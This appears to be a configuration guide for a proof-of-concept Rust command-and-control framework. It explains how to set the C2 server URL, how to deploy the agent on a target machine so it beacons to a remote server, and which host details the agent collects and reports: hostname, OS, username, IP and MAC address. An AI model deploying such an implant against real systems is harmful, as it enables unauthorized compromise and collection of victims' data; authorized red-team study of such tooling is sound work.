# [ REDACTED ] Configuration Guide

## Server URL Configuration

Both the agent and client can be configured to connect to a custom C2 server.

### Method 1: Environment Variable (Recommended)

Set the `C2_SERVER` environment variable:

```bash
# For Agent
export C2_SERVER="http://your-server-ip:8080"
./agent/target/release/agent

# For Client
export C2_SERVER="http://your-server-ip:8080"
./client/target/release/client
```

### Method 2: Command Line Argument (Agent Only)

Pass the server URL as the first argument:

```bash
./agent/target/release/agent http://your-server-ip:8080
```

### Default Behavior

If no configuration is provided:
- **Default URL**: `http://127.0.0.1:8080`
- Suitable for local testing only

## Quick Start Examples

### Local Testing (Default)
```bash
# Terminal 1: Start the server
cd server
cargo run

# Terminal 2: Start the client
cd client
cargo run

# Terminal 3: Start the agent
cd agent
cargo run
```

### Remote Deployment
```bash
# On the C2 Server (e.g., VPS at 10.20.30.40)
cd server
cargo run --release

# On the Operator Machine
export C2_SERVER="http://10.20.30.40:8080"
cd client
cargo run --release

# On the Target Machine (deploy the agent)
./agent http://10.20.30.40:8080
```

### Production Deployment
```bash
# Build release binaries
cd agent && cargo build --release
cd ../client && cargo build --release

# Agent binary location
./agent/target/release/agent

# Client binary location
./client/target/release/client

# Deploy agent to target with custom server
export C2_SERVER="http://c2.example.com:8080"
./agent/target/release/agent
```

## Configuration Priority

The configuration is resolved in the following order:

**For Agent:**
1. Command line argument (highest priority)
2. `C2_SERVER` environment variable
3. Default `http://127.0.0.1:8080` (lowest priority)

**For Client:**
1. `C2_SERVER` environment variable
2. Default `http://127.0.0.1:8080`

## System Information Collection

The agent now collects real system information:

### Collected Data
- **Hostname**: From system
- **OS Type**: Linux/Windows/macOS
- **OS Version**: Detailed version from:
  - Linux: `/etc/os-release` (PRETTY_NAME)
  - Windows: `ver` command
  - macOS: `sw_vers` command
- **Username**: Current user context
- **IP Address**: First non-loopback IP from:
  - Linux: `hostname -I` or `ip addr`
  - Windows: `ipconfig`
- **MAC Address**: From network interfaces:
  - Linux: `/sys/class/net/*/address` or `ip link`
  - Windows: `getmac`

### Supported Network Interfaces (Linux)
The agent tries these interfaces in order:
- eth0
- enp0s3
- ens33
- wlan0
- wlp2s0

## Security Notes

⚠️ **IMPORTANT**: 
- This is a proof-of-concept C2 framework
- Use only in authorized environments
- Change default password in production
- Use HTTPS for production deployments
- Implement proper authentication

## Troubleshooting

### Agent Can't Connect
```bash
# Check if server is reachable
curl http://your-server-ip:8080/agents

# Verify environment variable
echo $C2_SERVER

# Check agent logs for connection errors
```

### No System Info Showing
```bash
# Test network commands manually
hostname -I
ip addr
cat /sys/class/net/eth0/address

# Check agent has necessary permissions
```

### MAC Address Shows 00:00:00:00:00:00
- Agent couldn't find any valid network interface
- Check available interfaces: `ip link` or `ifconfig`
- May need root/admin privileges

## Building from Source

```bash
# Build all components
nix develop --command bash -c "
  cd agent && cargo build --release &&
  cd ../client && cargo build --release &&
  cd ../server && cargo build --release
"
```

## Environment Variables Reference

| Variable | Component | Default | Description |
|----------|-----------|---------|-------------|
| `C2_SERVER` | Agent, Client | `http://127.0.0.1:8080` | C2 server URL |
| `USER` or `USERNAME` | Agent | `unknown` | Fallback username |

---

**[ CLASSIFIED - FOR AUTHORIZED USE ONLY ]**
